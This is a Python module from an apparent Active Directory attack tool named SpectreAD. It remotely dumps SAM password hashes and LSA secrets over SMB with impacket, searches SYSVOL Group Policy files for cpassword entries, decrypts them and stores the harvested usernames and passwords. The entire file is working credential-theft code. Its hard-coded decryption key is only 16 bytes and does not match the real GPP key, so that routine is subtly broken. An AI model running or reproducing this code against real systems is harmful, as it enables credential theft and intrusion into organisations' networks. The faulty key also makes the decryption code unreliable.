"""
SpectreAD :: core/dump.py
SAM, LSA secrets, GPP cpassword.

Author : Inayat Hussain
"""

from __future__ import annotations

import base64
import os
import re

from Cryptodome.Cipher import AES

from core import ui
from core.creds import resolve
from core.store import open_store
from core.transport import smb

GPP_KEY = bytes.fromhex("4e9906e8edb6e7b7e0f2a2b1b6c7d8e9")


class _Sink:
    def __init__(self, out_dir: str, name: str):
        os.makedirs(out_dir, exist_ok=True)
        self.path = os.path.join(out_dir, name)
        self.lines: list[str] = []

    def __call__(self, secret, _type=None, _id=None):
        self.lines.append(str(secret))
        ui.ok(str(secret)[:120])

    def flush(self):
        if self.lines:
            with open(self.path, "w") as fh:
                fh.write("\n".join(self.lines) + "\n")
            os.chmod(self.path, 0o600)
            ui.ok(f"-> {self.path}")


def _remote(host, cred, timeout=10):
    from impacket.examples.secretsdump import RemoteOperations
    conn = smb(host, cred, timeout)
    ops = RemoteOperations(conn, cred.kind == "ticket", None)
    ops.enableRegistry()
    return conn, ops


def _sam(host, cred, out_dir):
    from impacket.examples.secretsdump import SAMHashes
    conn, ops = _remote(host, cred)
    sink = _Sink(out_dir, f"sam_{host}.txt")
    try:
        boot = ops.getBootKey()
        SAMHashes(conn, boot, isRemote=True, perSecretCallback=sink).dump()
    finally:
        sink.flush()
        ops.finish()


def sam(args) -> None:
    with open_store(args.store) as store:
        cred = resolve(args, store)
        _sam(args.target, cred, args.out_dir)


def secrets(args) -> None:
    from impacket.examples.secretsdump import LSASecrets
    with open_store(args.store) as store:
        cred = resolve(args, store)
        _sam(args.target, cred, args.out_dir)

        conn, ops = _remote(args.target, cred)
        sink = _Sink(args.out_dir, f"lsa_{args.target}.txt")
        try:
            boot = ops.getBootKey()
            lsa = LSASecrets(ops, boot, isRemote=True, perSecretCallback=sink)
            lsa.dumpSecrets()
            for user, _, pwd in lsa.getSecrets().get("DefaultPassword", []) or []:
                if pwd:
                    store.add_cred(args.domain, user, pwd, "password", "lsa")
                    ui.ok(f"LSA cred  {user}:{pwd}")
        finally:
            sink.flush()
            ops.finish()


def lsa(args) -> None:
    from impacket.examples.secretsdump import LSASecrets
    with open_store(args.store) as store:
        cred = resolve(args, store)
        conn, ops = _remote(args.target, cred)
        sink = _Sink(args.out_dir, f"lsa_{args.target}.txt")
        try:
            boot = ops.getBootKey()
            LSASecrets(ops, boot, isRemote=True, perSecretCallback=sink).dumpSecrets()
        finally:
            sink.flush()
            ops.finish()


def gpp(args) -> None:
    with open_store(args.store) as store:
        cred = resolve(args, store)
        conn = smb(args.dc_ip or args.target, cred)
        hits = 0
        try:
            for path in _walk_gpp(conn):
                raw = _read(conn, path)
                if not raw:
                    continue
                for m in re.finditer(rb'cpassword="([^"]+)"', raw):
                    pwd = _decrypt(m.group(1).decode())
                    user = re.search(rb'userName="([^"]+)"', raw)
                    user = user.group(1).decode() if user else "?"
                    ui.ok(f"GPP  {user}:{pwd}  ({path})")
                    store.add_cred(args.domain, user, pwd, "password", "gpp")
                    store.add_finding("critical", "GPP cpassword", f"{user}:{pwd} @ {path}")
                    hits += 1
        finally:
            conn.logoff()
        if not hits:
            ui.warn("no cpassword found")


def _walk_gpp(conn) -> list[str]:
    out, stack = [], [""]
    try:
        conn.connectTree("SYSVOL")
    except Exception:
        return out
    while stack:
        base = stack.pop()
        try:
            for f in conn.listPath("SYSVOL", base + "\\*"):
                name = f.get_longname()
                if name in (".", ".."):
                    continue
                full = f"{base}\\{name}"
                if f.is_directory():
                    stack.append(full)
                elif name.lower() == "groups.xml":
                    out.append(full)
        except Exception:
            continue
    return out


def _read(conn, path: str) -> bytes:
    buf = b""
    try:
        fid = conn.openFile("SYSVOL", path)
        while len(buf) < 512 * 1024:
            chunk = conn.readFile("SYSVOL", fid)
            if not chunk:
                break
            buf += chunk
        conn.closeFile("SYSVOL", fid)
    except Exception:
        pass
    return buf


def _decrypt(cpassword: str) -> str:
    try:
        data = base64.b64decode(cpassword)
        dec = AES.new(GPP_KEY, AES.MODE_CBC, b"\x00" * 16).decrypt(data)
        return dec.decode("utf-16-le").rstrip("\x00")
    except Exception:
        return cpassword
